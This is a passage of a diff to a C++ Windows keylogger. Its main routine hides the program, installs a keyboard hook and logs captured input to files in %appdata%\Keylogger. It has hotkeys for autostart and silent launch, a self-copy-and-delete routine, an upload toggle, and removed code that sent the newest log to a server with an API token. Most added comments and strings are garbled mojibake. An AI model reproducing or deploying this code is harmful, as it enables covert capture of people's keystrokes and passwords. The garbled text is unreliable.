+                // �������ɾ��ʧ�ܣ������ӳ�ɾ����������ɾ����
+                if (!MoveFileExW(oldPath.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT))
+                {
+                    lastError = GetLastError();
+                    wchar_t msg[512];
+                    wsprintfW(msg, L"ɾ��ԭ����ʧ�ܣ������룺%lu\n·����%s\n�������ӳ�ɾ������������Ч��", lastError, oldPath.c_str());
+                    MessageBoxW(NULL, msg, L"ɾ������", MB_ICONERROR);
+                }
+                else
+                {
+                    // �ӳ�ɾ���ɹ���֪ͨ�û�
+                    MessageBoxW(NULL, L"ԭ�������´�����ʱ��ɾ����", L"��ʾ", MB_ICONINFORMATION);
+                }
+            }
+        }
+        if (argv) LocalFree(argv);
+    }
+}
+// ==================== ������ ====================
 int main()
 {
+    // ���ȴ����Ը�����ɾ�����ļ��������� Stealth ֮ǰ����Ϊ�����漰�˳����̣�
+    HandleSelfCopyAndDelete();
+
     Stealth();
-    std::string token = api_get();
-    if (token.empty()) {
-        return 1;
-    }
-    std::cout << "获取到 token: " << token << std::endl;
 
-    // 2. 获取程序执行目录
-    std::string exeDir = getExecutableDir();
-    if (exeDir.empty()) {
-        return 1;
-    }
-    std::cout << "程序执行目录: " << exeDir << std::endl;
-
-    // 3. 查找最新的日志文件
-    std::string latestLogPath = findLatestLogFile(exeDir);
-    if (latestLogPath.empty()) {
-        return 1;
-    }
-    std::cout << "最新的日志文件: " << latestLogPath << std::endl;
-
-    // 4. 配置服务器目标路径（保持与本地文件名一致，上传到服务器的临时文件夹）
-    fs::path logPath(latestLogPath);
-    std::string fileName = logPath.filename().string();  // 提取文件名（如 192.168.1.2_20251019.log）
-    std::string serverFile = "/%E5%AD%A6%E7%94%9F%E7%9B%AE%E5%BD%95/log/" + fileName;  // 服务器路径（根据实际调整）
-
-    // 5. 上传文件
-    uploadFile(token, latestLogPath, serverFile);
-
+    // ��Ĭģʽ��ʾ�����δ������Ĭģʽ����ʾ������ʾ��
     if (!IsSilentMode()) {
-        MessageBox(NULL, L"开录 q(≧▽≦q)\n\n快捷键小提示ww\nCtrl + Shift + Alt + P  暂停录制\nCtrl + Shift + Alt + Q  结束录制\nCtrl + Shift + Alt + S  设置/取消开机自启\nCtrl + Shift + Alt + D  设置/取消静默启动\n\n录制日志将保存在当前目录ヾ(≧▽≦*)o，文件名格式为 ip_日期.log  例：192.168.1.2_20251019.log", L"录制开始", MB_OK);
+        MessageBoxW(NULL, L"��¼ q(�R���Qq)\n\n��ݼ�С��ʾww\n"
+            L"Ctrl + Shift + Alt + P  ��ͣ¼��\n"
+            L"Ctrl + Shift + Alt + Q  ����¼��\n"
+            L"Ctrl + Shift + Alt + S  ����/ȡ����������\n"
+            L"Ctrl + Shift + Alt + D  ����/ȡ����Ĭ����\n"
+            L"Ctrl + Shift + Alt + U  ����/�ر��ϴ�����\n\n"
+            L"¼����־�������� %appdata%\\Keylogger Ŀ¼���ļ��� ip_����.log",
+            L"¼�ƿ�ʼ", MB_OK);
     }
+
 #ifdef bootwait 
     while (IsSystemBooting())
     {
@@ -682,10 +1017,13 @@ int main()
     std::cout << "跳过系统启动检查。\n";
 #endif
 
+    // ȷ����־Ŀ¼����
+    GetLogDirectory();
+
     std::string output_filename = MakeOutputFilename();
     std::cout << "输出日志到 " << output_filename << std::endl;
 
-    output_file.open(output_filename, std::ios_base::app);
+    output_file.open(output_filename, std::ios_base::app | std::ios::binary);
 
     SetHook();
 
@@ -693,7 +1031,7 @@ int main()
     while (GetMessage(&msg, NULL, 0, 0))
     {
     }
-
+    CleanupNotifyIcon();
     ReleaseHook();
     output_file.close();
     return 0;
